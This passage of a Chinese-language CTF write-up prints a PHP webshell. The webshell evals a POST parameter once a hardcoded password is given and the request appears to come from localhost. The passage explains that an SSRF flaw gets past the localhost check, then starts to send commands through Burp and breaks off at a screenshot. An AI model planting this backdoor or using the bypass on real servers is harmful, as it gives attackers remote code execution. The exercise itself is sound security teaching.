```
<?php
$serverList = array("127.0.0.1");$ip = $_SERVER['REMOTE_ADDR'];foreach ($serverList as $host) {if ($ip === $host) {if ((!empty($_POST['admin'])) and $_POST['admin'] === 'h1admin') {@eval($_POST['hacker']);} else {die("You aren't admin!");}} else {die('This is webshell');}
```

后门的意思是需要post传输一个admin参数并且等于h1admin，post传输一个hacker执行命令，但是必须是127.0.0.1才可以访问执行。这里我们借助SSRF漏洞可以直接绕过

  

为了方便我们本地调试一下，本地访问

  

![](../Images/aa31ca081763825a26d30408c2775a20.png)

提示You aren't admin! 说明我们过了if ($ip === $host) 但是没有过里面那一层if。原因很简单我们用127去访问的，如果我们直接访问就是提示This is webshell，原因就是不是本地127访问的。

  

接着我们去执行命令，需要用到burp

  

![](../Images/981761c0db7842ea3744b5c514c8953a.png)
